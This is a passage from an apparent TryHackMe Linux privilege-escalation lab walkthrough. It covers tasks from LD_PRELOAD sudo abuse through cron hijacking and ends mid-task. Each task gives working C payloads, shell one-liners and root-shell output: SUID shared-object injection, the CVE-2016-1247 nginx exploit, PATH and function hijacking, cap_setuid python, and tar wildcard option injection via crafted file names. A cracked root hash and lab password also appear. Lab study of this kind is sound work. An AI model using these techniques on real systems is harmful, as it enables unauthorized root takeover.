root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_PrivEsc_Arena]
└─$ john --wordlist=/usr/share/wordlists/nmap.lst root.hash
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (root)     
1g 0:00:00:00 DONE (2026-03-15 13:10) 1.851g/s 2844p/s 2844c/s 2844C/s 14344..redsox
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

---------------------------------------------------------------------------------------

### Task 10: Sudo (LD_PRELOAD)

#### Detection

Linux VM

1. In command prompt type: `sudo -l`
2. From the output, notice that the LD_PRELOAD environment variable is intact.

#### Exploitation

1. Open a text editor and type:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

2. Save the file as x.c
3. In command prompt type: `gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles`
4. In command prompt type: `sudo LD_PRELOAD=/tmp/x.so apache2`
5. In command prompt type: `id`

---------------------------------------------------------------------------------------

#### Check for sudo access

```bash
TCM@debian:~$ sudo -l
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD

User TCM may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
TCM@debian:~$ 
```

#### Create exploit

```bash
TCM@debian:~$ vi exploit.c
TCM@debian:~$ cat exploit.c 
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

TCM@debian:~$ gcc -fPIC -shared -o /tmp/x.so exploit.c -nostartfiles
TCM@debian:~$ 
```

#### Use the exploit

```bash
TCM@debian:~$ sudo LD_PRELOAD=/tmp/x.so apache2
root@debian:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
root@debian:/home/user# exit
exit
apache2: bad user name ${APACHE_RUN_USER}
TCM@debian:~$ 
```

---------------------------------------------------------------------------------------

### Task 11: SUID (Shared Object Injection)

#### Detection

Linux VM

1. In command prompt type: `find / -type f -perm -04000 -ls 2>/dev/null`
2. From the output, make note of all the SUID binaries.
3. In command line type: `strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"`
4. From the output, notice that a .so file is missing from a writable directory.

#### Exploitation

Linux VM

5. In command prompt type: `mkdir /home/user/.config`
6. In command prompt type: `cd /home/user/.config`
7. Open a text editor and type:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

8. Save the file as `libcalc.c`
9. In command prompt type: `gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c`
10. In command prompt type: `/usr/local/bin/suid-so`
11. In command prompt type: `id`

---------------------------------------------------------------------------------------

#### Check for SUID files

```bash
TCM@debian:~$ find / -type f -perm -04000 -ls 2>/dev/null
809081   40 -rwsr-xr-x   1 root     root        37552 Feb 15  2011 /usr/bin/chsh
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudo
810173   36 -rwsr-xr-x   1 root     root        32808 Feb 15  2011 /usr/bin/newgrp
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudoedit
809080   44 -rwsr-xr-x   1 root     root        43280 Mar 15 06:47 /usr/bin/passwd
809078   64 -rwsr-xr-x   1 root     root        60208 Feb 15  2011 /usr/bin/gpasswd
809077   40 -rwsr-xr-x   1 root     root        39856 Feb 15  2011 /usr/bin/chfn
816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env
816764    8 -rwsr-sr-x   1 root     staff        6899 May 14  2017 /usr/local/bin/suid-env2
815723  948 -rwsr-xr-x   1 root     root       963691 May 13  2017 /usr/sbin/exim-4.84-3
832517    8 -rwsr-xr-x   1 root     root         6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
832743  212 -rwsr-xr-x   1 root     root       212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
812623   12 -rwsr-xr-x   1 root     root        10592 Feb 15  2016 /usr/lib/pt_chown
473324   36 -rwsr-xr-x   1 root     root        36640 Oct 14  2010 /bin/ping6
473323   36 -rwsr-xr-x   1 root     root        34248 Oct 14  2010 /bin/ping
473292   84 -rwsr-xr-x   1 root     root        78616 Jan 25  2011 /bin/mount
473312   36 -rwsr-xr-x   1 root     root        34024 Feb 15  2011 /bin/su
473290   60 -rwsr-xr-x   1 root     root        53648 Jan 25  2011 /bin/umount
465223  100 -rwsr-xr-x   1 root     root        94992 Dec 13  2014 /sbin/mount.nfs
TCM@debian:~$ 
```

#### Analyse the suid-so binary

```bash
TCM@debian:~$ strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libdl.so.2", O_RDONLY)       = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libm.so.6", O_RDONLY)        = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 3
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
TCM@debian:~$ 
```

#### Create an exploit

```bash
TCM@debian:~$ mkdir /home/user/.config
TCM@debian:~$ cd /home/user/.config
TCM@debian:~/.config$ vi libcalc.c
TCM@debian:~/.config$ cat libcalc.c 
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}

TCM@debian:~/.config$ gcc -shared -o libcalc.so -fPIC libcalc.c
TCM@debian:~/.config$ file libcalc.so
libcalc.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, not stripped
TCM@debian:~/.config$ 
```

#### Use the exploit

```bash
TCM@debian:~/.config$ /usr/local/bin/suid-so
Calculating something, please wait...
bash-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
bash-4.1# exit
exit
[=====================================================================>] 99 %
Done.
TCM@debian:~/.config$ 
```

---------------------------------------------------------------------------------------

### Task 12: SUID (Symlinks)

#### Detection

Linux VM

1. In command prompt type: `dpkg -l | grep nginx`
2. From the output, notice that the installed nginx version is below 1.6.2-5+deb8u3.

#### Exploitation

Linux VM – Terminal 1

1. For this exploit, it is required that the user be www-data. To simulate this escalate to root by typing: `su root`
2. The root password is `password123`
3. Once escalated to root, in command prompt type: `su -l www-data`
4. In command prompt type: `/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log`
5. At this stage, the system waits for logrotate to execute. In order to speed up the process, this will be simulated by connecting to the Linux VM via a different terminal.

Linux VM – Terminal 2

1. Once logged in, type: `su root`
2. The root password is `password123`
3. As root, type the following: `invoke-rc.d nginx rotate >/dev/null 2>&1`
4. Switch back to the previous terminal.

Linux VM – Terminal 1

1. From the output, notice that the exploit continued its execution.
2. In command prompt type: `id`

---------------------------------------------------------------------------------------

#### What CVE is being exploited in this task?

Googling for `nginx exploit 1.6.2 symlink` gives us: [https://nvd.nist.gov/vuln/detail/CVE-2016-1247](https://nvd.nist.gov/vuln/detail/CVE-2016-1247)

Answer: `CVE-2016-1247`

#### What binary is SUID enabled and assists in the attack?

Answer: ``sudo`

#### Detect the vulnerable version

```bash
TCM@debian:~$ dpkg -l | grep nginx
ii  nginx-common                        1.6.2-5+deb8u2~bpo70+1       small, powerful, scalable web/proxy server - common files
ii  nginx-full                          1.6.2-5+deb8u2~bpo70+1       nginx web/proxy server (standard version)
TCM@debian:~$ 
```

#### Run exploit as www-data

```bash
TCM@debian:~$ su root
Password: 
root@debian:/home/user# su -l www-data
www-data@debian:~$ /home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log
 _______________________________
< Is your server (N)jinxed ? ;o >
 -------------------------------
           \ 
            \          __---__
                    _-       /--______
               __--( /     \ )XXXXXXXXXXX\v.  
             .-XXX(   O   O  )XXXXXXXXXXXXXXX- 
            /XXX(       U     )        XXXXXXX\ 
          /XXXXX(              )--_  XXXXXXXXXXX\ 
         /XXXXX/ (      O     )   XXXXXX   \XXXXX\ 
         XXXXX/   /            XXXXXX   \__ \XXXXX
         XXXXXX__/          XXXXXX         \__---->
 ---___  XXX__/          XXXXXX      \__         /
   \-  --__/   ___/\  XXXXXX            /  ___--/=
    \-\    ___/    XXXXXX              '--- XXXXXX
       \-\/XXX\ XXXXXX                      /XXXXX
         \XXXXXXXXX   \                    /XXXXX/
          \XXXXXX      >                 _/XXXXX/
            \XXXXX--__/              __-- XXXX/
             -XXXXXXXX---------------  XXXXXX-
                \XXXXXXXXXXXXXXXXXXXXXXXXXX/
                  ""VXXXXXXXXXXXXXXXXXXV""
 
Nginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247)                                                                                                              
nginxed-root.sh (ver. 1.0)
                                                                                                                                                                                                  
Discovered and coded by:
                                                                                                                                                                                                  
Dawid Golunski
https://legalhackers.com

[+] Starting the exploit as: 
uid=33(www-data) gid=33(www-data) groups=33(www-data)

[+] Compiling the privesc shared library (/tmp/privesclib.c)

[+] Backdoor/low-priv shell installed at: 
-rwxr-xr-x 1 www-data www-data 926536 Mar 15 08:40 /tmp/nginxrootsh

[+] The server appears to be (N)jinxed (writable logdir) ! :) Symlink created at: 
lrwxrwxrwx 1 www-data www-data 18 Mar 15 08:40 /var/log/nginx/error.log -> /etc/ld.so.preload

[+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am...
```

#### Force a logratate

```bash
┌──(kali㉿kali)-[~]
└─$ ssh -oHostKeyAlgorithms=+ssh-rsa TCM@$TARGET_IP
TCM@10.113.169.236's password: 
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Mar 15 08:30:44 2026 from ip-10-113-95-101.eu-central-1.compute.internal
TCM@debian:~$ su root
Password: 
root@debian:/home/user# invoke-rc.d nginx rotate >/dev/null 2>&1
root@debian:/home/user# 
```

#### Check status on the exploit

```bash
www-data@debian:~$ /home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log
 _______________________________
< Is your server (N)jinxed ? ;o >
 -------------------------------
           \ 
            \          __---__
                    _-       /--______
               __--( /     \ )XXXXXXXXXXX\v.  
             .-XXX(   O   O  )XXXXXXXXXXXXXXX- 
            /XXX(       U     )        XXXXXXX\ 
          /XXXXX(              )--_  XXXXXXXXXXX\ 
         /XXXXX/ (      O     )   XXXXXX   \XXXXX\ 
         XXXXX/   /            XXXXXX   \__ \XXXXX
         XXXXXX__/          XXXXXX         \__---->
 ---___  XXX__/          XXXXXX      \__         /
   \-  --__/   ___/\  XXXXXX            /  ___--/=
    \-\    ___/    XXXXXX              '--- XXXXXX
       \-\/XXX\ XXXXXX                      /XXXXX
         \XXXXXXXXX   \                    /XXXXX/
          \XXXXXX      >                 _/XXXXX/
            \XXXXX--__/              __-- XXXX/
             -XXXXXXXX---------------  XXXXXX-
                \XXXXXXXXXXXXXXXXXXXXXXXXXX/
                  ""VXXXXXXXXXXXXXXXXXXV""
 
Nginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247)                                                                                                              
nginxed-root.sh (ver. 1.0)

Discovered and coded by:

Dawid Golunski
https://legalhackers.com

[+] Starting the exploit as: 
uid=33(www-data) gid=33(www-data) groups=33(www-data)

[+] Compiling the privesc shared library (/tmp/privesclib.c)

[+] Backdoor/low-priv shell installed at: 
-rwxr-xr-x 1 www-data www-data 926536 Mar 15 08:40 /tmp/nginxrootsh

[+] The server appears to be (N)jinxed (writable logdir) ! :) Symlink created at: 
lrwxrwxrwx 1 www-data www-data 18 Mar 15 08:40 /var/log/nginx/error.log -> /etc/ld.so.preload

[+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am... 
[+] Nginx restarted. The /etc/ld.so.preload file got created with web server privileges: 
-rw-r--r-- 1 www-data root 19 Mar 15 08:45 /etc/ld.so.preload

[+] Adding /tmp/privesclib.so shared lib to /etc/ld.so.preload

[+] The /etc/ld.so.preload file now contains: 
/tmp/privesclib.so

[+] Escalating privileges via the /usr/bin/sudo SUID binary to get root!
-rwsrwxrwx 1 root root 926536 Mar 15 08:40 /tmp/nginxrootsh

[+] Rootshell got assigned root SUID perms at: 
-rwsrwxrwx 1 root root 926536 Mar 15 08:40 /tmp/nginxrootsh

The server is (N)jinxed ! ;) Got root via Nginx!

[+] Spawning the rootshell /tmp/nginxrootsh now! 

nginxrootsh-4.1# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
nginxrootsh-4.1# 
```

---------------------------------------------------------------------------------------

### Task 13: SUID (Environment Variables #1)

#### Detection

Linux VM

1. In command prompt type: `find / -type f -perm -04000 -ls 2>/dev/null`
2. From the output, make note of all the SUID binaries.
3. In command prompt type: `strings /usr/local/bin/suid-env`
4. From the output, notice the functions used by the binary.

#### Exploitation

Linux VM

1. In command prompt type: `echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c`
2. In command prompt type: `gcc /tmp/service.c -o /tmp/service`
3. In command prompt type: `export PATH=/tmp:$PATH`
4. In command prompt type: `/usr/local/bin/suid-env`
5. In command prompt type: `id`

---------------------------------------------------------------------------------------

#### Detect and analyse the vulnerable SUID binary

```bash
TCM@debian:~$ find / -type f -perm -04000 -ls 2>/dev/null
809081   40 -rwsr-xr-x   1 root     root        37552 Feb 15  2011 /usr/bin/chsh
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudo
810173   36 -rwsr-xr-x   1 root     root        32808 Feb 15  2011 /usr/bin/newgrp
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudoedit
809080   44 -rwsr-xr-x   1 root     root        43280 Mar 15 06:47 /usr/bin/passwd
809078   64 -rwsr-xr-x   1 root     root        60208 Feb 15  2011 /usr/bin/gpasswd
809077   40 -rwsr-xr-x   1 root     root        39856 Feb 15  2011 /usr/bin/chfn
816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env
816764    8 -rwsr-sr-x   1 root     staff        6899 May 14  2017 /usr/local/bin/suid-env2
815723  948 -rwsr-xr-x   1 root     root       963691 May 13  2017 /usr/sbin/exim-4.84-3
832517    8 -rwsr-xr-x   1 root     root         6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
832743  212 -rwsr-xr-x   1 root     root       212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
812623   12 -rwsr-xr-x   1 root     root        10592 Feb 15  2016 /usr/lib/pt_chown
473324   36 -rwsr-xr-x   1 root     root        36640 Oct 14  2010 /bin/ping6
473323   36 -rwsr-xr-x   1 root     root        34248 Oct 14  2010 /bin/ping
473292   84 -rwsr-xr-x   1 root     root        78616 Jan 25  2011 /bin/mount
473312   36 -rwsr-xr-x   1 root     root        34024 Feb 15  2011 /bin/su
473290   60 -rwsr-xr-x   1 root     root        53648 Jan 25  2011 /bin/umount
1158726  912 -rwsrwxrwx   1 root     root       926536 Mar 15 08:40 /tmp/nginxrootsh
1158725  912 -rwsr-sr-x   1 root     staff      926536 Mar 15 08:25 /tmp/bash
465223  100 -rwsr-xr-x   1 root     root        94992 Dec 13  2014 /sbin/mount.nfs
TCM@debian:~$ strings -n 6 /usr/local/bin/suid-env
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fffff.
service apache2 start
TCM@debian:~$ 
```

Note that the `service` command lacks a full path!

#### What is the last line of the "strings /usr/local/bin/suid-env" output?

See output above.

Answer: `service apache2 start`

#### Create an exploit and use it

```bash
TCM@debian:~$ echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
TCM@debian:~$ cat /tmp/service.c
int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }
TCM@debian:~$  gcc /tmp/service.c -o /tmp/service
TCM@debian:~$ export PATH=/tmp:$PATH
TCM@debian:~$ /usr/local/bin/suid-env
root@debian:~# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
root@debian:~# exit
exit
TCM@debian:~$ 
```

---------------------------------------------------------------------------------------

### Task 14: SUID (Environment Variables #2)

#### Detection

Linux VM

1. In command prompt type: `find / -type f -perm -04000 -ls 2>/dev/null`
2. From the output, make note of all the SUID binaries.
3. In command prompt type: `strings /usr/local/bin/suid-env2`
4. From the output, notice the functions used by the binary.

#### Exploitation Method #1

Linux VM

1. In command prompt type: `function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }`
2. In command prompt type: `export -f /usr/sbin/service`
3. In command prompt type: `/usr/local/bin/suid-env2`

#### Exploitation Method #2

Linux VM

1. In command prompt type: `env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'`

---------------------------------------------------------------------------------------

#### Detect and analyse the vulnerable SUID binary

```bash
TCM@debian:~$ find / -type f -perm -04000 -ls 2>/dev/null
809081   40 -rwsr-xr-x   1 root     root        37552 Feb 15  2011 /usr/bin/chsh
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudo
810173   36 -rwsr-xr-x   1 root     root        32808 Feb 15  2011 /usr/bin/newgrp
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudoedit
809080   44 -rwsr-xr-x   1 root     root        43280 Mar 15 06:47 /usr/bin/passwd
809078   64 -rwsr-xr-x   1 root     root        60208 Feb 15  2011 /usr/bin/gpasswd
809077   40 -rwsr-xr-x   1 root     root        39856 Feb 15  2011 /usr/bin/chfn
816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env
816764    8 -rwsr-sr-x   1 root     staff        6899 May 14  2017 /usr/local/bin/suid-env2
815723  948 -rwsr-xr-x   1 root     root       963691 May 13  2017 /usr/sbin/exim-4.84-3
832517    8 -rwsr-xr-x   1 root     root         6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
832743  212 -rwsr-xr-x   1 root     root       212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
812623   12 -rwsr-xr-x   1 root     root        10592 Feb 15  2016 /usr/lib/pt_chown
473324   36 -rwsr-xr-x   1 root     root        36640 Oct 14  2010 /bin/ping6
473323   36 -rwsr-xr-x   1 root     root        34248 Oct 14  2010 /bin/ping
473292   84 -rwsr-xr-x   1 root     root        78616 Jan 25  2011 /bin/mount
473312   36 -rwsr-xr-x   1 root     root        34024 Feb 15  2011 /bin/su
473290   60 -rwsr-xr-x   1 root     root        53648 Jan 25  2011 /bin/umount
1158726  912 -rwsrwxrwx   1 root     root       926536 Mar 15 08:40 /tmp/nginxrootsh
1158725  912 -rwsr-sr-x   1 root     staff      926536 Mar 15 08:25 /tmp/bash
465223  100 -rwsr-xr-x   1 root     root        94992 Dec 13  2014 /sbin/mount.nfs
TCM@debian:~$ strings -n 6 /usr/local/bin/suid-env2
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fffff.
/usr/sbin/service apache2 start
TCM@debian:~$ 
```

Note that the `service` command now has a full path!

#### What is the last line of the "strings /usr/local/bin/suid-env2" output?

See output above.

Answer: `/usr/sbin/service apache2 start`

#### Create an exploit and use it

```bash
TCM@debian:~$ function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
TCM@debian:~$ export -f /usr/sbin/service
TCM@debian:~$ /usr/local/bin/suid-env2
bash-4.1# id
uid=0(root) gid=0(root) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
bash-4.1# exit
exit
TCM@debian:~$ 
```

---------------------------------------------------------------------------------------

### Task 15: Capabilities

#### Detection

Linux VM

1. In command prompt type: `getcap -r / 2>/dev/null`
2. From the output, notice the value of the “cap_setuid” capability.

#### Exploitation

Linux VM

1. In command prompt type: `/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
2. Enjoy root!

---------------------------------------------------------------------------------------

#### Check for capabiliites

```bash
TCM@debian:~$ getcap -r / 2>/dev/null
/usr/bin/python2.6 = cap_setuid+ep
TCM@debian:~$ 
```

#### PrivEsc via capabilities

```bash
TCM@debian:~$ python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@debian:~# id
uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
root@debian:~# exit
exit
TCM@debian:~$ 
```

---------------------------------------------------------------------------------------

### Task 16: Cron (Path)

#### Detection

Linux VM

1. In command prompt type: `cat /etc/crontab`
2. From the output, notice the value of the “PATH” variable.

#### Exploitation

Linux VM

1. In command prompt type: `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh`
2. In command prompt type: `chmod +x /home/user/overwrite.sh`
3. Wait 1 minute for the Bash script to execute.
4. In command prompt type: `/tmp/bash -p`
5. In command prompt type: `id`

---------------------------------------------------------------------------------------

#### Check the global crontab

```bash
TCM@debian:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh

TCM@debian:~$ 
```

Note that `/home/user` is first in the PATH.

#### Create an exploit and wait for it to run

```bash
TCM@debian:~$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
TCM@debian:~$ chmod +x /home/user/overwrite.sh
TCM@debian:~$ date
Sun Mar 15 09:09:52 EDT 2026
TCM@debian:~$ date
Sun Mar 15 09:10:49 EDT 2026
TCM@debian:~$ ls -l /tmp/bash
-rwsr-sr-x 1 root staff 926536 Mar 15 09:11 /tmp/bash
TCM@debian:~$ 
```

#### Trigger the new root bash

```bash
TCM@debian:~$ /tmp/bash -p
bash-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
bash-4.1# exit
exit
TCM@debian:~$ 
```

---------------------------------------------------------------------------------------

### Task 17: Cron (Wildcards)

#### Detection

Linux VM

1. In command prompt type: `cat /etc/crontab`
2. From the output, notice the script “/usr/local/bin/compress.sh”
3. In command prompt type: `cat /usr/local/bin/compress.sh`
4. From the output, notice the wildcard (*) used by ‘tar’.

#### Exploitation

Linux VM

1. In command prompt type: `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh`
2. `touch /home/user/--checkpoint=1`
3. `touch /home/user/--checkpoint-action=exec=sh\ runme.sh`
4. Wait 1 minute for the Bash script to execute.
5. In command prompt type: `/tmp/bash -p`
6. In command prompt type: `id`

---------------------------------------------------------------------------------------

#### Study the vulnerable script

```bash
TCM@debian:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh

TCM@debian:~$ cat /usr/local/bin/compress.sh 
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
TCM@debian:~$ 
```

Note the wildcard for `tar`.

#### Create an exploit and wait for it to execute

```bash
TCM@debian:~$ echo 'cp /bin/bash /tmp/bash2; chmod +s /tmp/bash2' > /home/user/runme.sh
TCM@debian:~$ touch /home/user/--checkpoint=1
TCM@debian:~$ touch /home/user/--checkpoint-action=exec=sh\ runme.sh
TCM@debian:~$ ls -l ./-*
-rw-r--r-- 1 TCM user 0 Mar 15 09:16 ./--checkpoint=1
-rw-r--r-- 1 TCM user 0 Mar 15 09:16 ./--checkpoint-action=exec=sh runme.sh
TCM@debian:~$ date
Sun Mar 15 09:17:43 EDT 2026
TCM@debian:~$ date
Sun Mar 15 09:18:51 EDT 2026
TCM@debian:~$ ls -l /tmp/bash2
-rwsr-sr-x 1 root root 926536 Mar 15 09:19 /tmp/bash2
TCM@debian:~$ 
```

#### Trigger the new root bash

```bash
TCM@debian:~$ /tmp/bash2 -p
bash2-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
bash2-4.1# exit
exit
TCM@debian:~$ 
```

---------------------------------------------------------------------------------------

### Task 18: Cron (File Overwrite)

#### Detection

Linux VM

1. In command prompt type: `cat /etc/crontab`
2. From the output, notice the script “overwrite.sh”
3. In command prompt type: `ls -l /usr/local/bin/overwrite.sh`
4. From the output, notice the file permissions.

#### Exploitation

Linux VM

1. In command prompt type: `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh`
2. Wait 1 minute for the Bash script to execute.
3. In command prompt type: `/tmp/bash -p`
4. In command prompt type: `id`

---------------------------------------------------------------------------------------

#### Find the vulnerable script

```bash
TCM@debian:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh

TCM@debian:~$ ls -l /usr/local/bin/overwrite.sh
-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
TCM@debian:~$ 
```

#### Create an exploit and wait for it to run

```bash
TCM@debian:~$ ls -l /usr/local/bin/overwrite.sh
-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
